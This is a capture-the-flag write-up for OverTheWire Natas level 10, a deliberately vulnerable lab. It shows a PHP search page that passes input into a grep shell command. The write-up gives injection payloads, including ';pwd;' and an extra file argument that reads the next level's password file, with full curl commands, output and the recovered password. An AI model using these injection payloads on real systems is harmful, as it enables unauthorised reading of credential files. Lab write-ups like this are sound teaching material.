# Level 10
## What does the page look like?
```html
$ curl --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu http://natas10.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas10", "pass": "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu" };</script></head>
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Source code
```html
$ curl -s --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu http://natas10.natas.labs.overthewire.org/index-source.html | html2text 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/
css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-
ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/
wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></
script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas10", "pass": "<censored>" };</
script></head>
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing:
 <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## First approach: double encoding
This time, the user input is checked and some characters are forbidden (`[`, `;`, `|`, `&` and `]`). Also notice that no method (`POST` or `GET`) is specified for the form. Hence, the default method will be `GET`.

~~~~
$ curl -s -d "needle=;pwd;&submit=Search" --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu http://natas10.natas.labs.overthewire.org/ | html2text 

****** natas10 ******
For security reasons, we now filter on certain characters

Find words containing: [needle              ][Search]

Output:
Input contains an illegal character!
View_sourcecode
~~~~

As only a limited number of characters are banned, we can still encode our payload.
~~~~
http://natas10.natas.labs.overthewire.org/?needle=%253Bpwd%253B&submit=Search
~~~~

However, this returns no result. I tried several encoding injections but none of them returned the result I was expecting for a reason that I could not understand. The regular expression on the server may be different and may actually include more characters.

## Different approach
Let's try a different approach. Back to the source code, we know the program is executing the following command:
~~~~
passthru("grep -i $key dictionary.txt")
~~~~
If we pass several files to the grep command, it will return matches in all files (i.e. `grep sthg a.txt b.txt` will look in both `a.txt` and `b.txt` files). Let's take advantage of that to search in `/etc/natas_webpass/natas11` as well:

~~~~
passthru("grep -i anything /etc/natas_webpass/natas11 dictionary.txt")
~~~~

Let's try with `a`:
```html
$ curl -s -d "needle=a /etc/natas_webpass/natas11&submit=Search" --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu http://natas10.natas.labs.overthewire.org/ | head -n 30
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas10", "pass": "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu" };</script></head>
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
dictionary.txt:American
dictionary.txt:Americanism
dictionary.txt:Americanism's
dictionary.txt:Americanisms
```

OK, the password does not contain `a`. Let's try `b`, no luck either. Maybe `c`?
```html
$ curl -s -d "needle=c /etc/natas_webpass/natas11&submit=Search" --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu http://natas10.natas.labs.overthewire.org/ | head -n 30
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas10", "pass": "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu" };</script></head>
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:American
dictionary.txt:Americanism
dictionary.txt:Americanism's
dictionary.txt:Americanisms
dictionary.txt:Americans
```

# Flag
~~~~
natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
~~~~
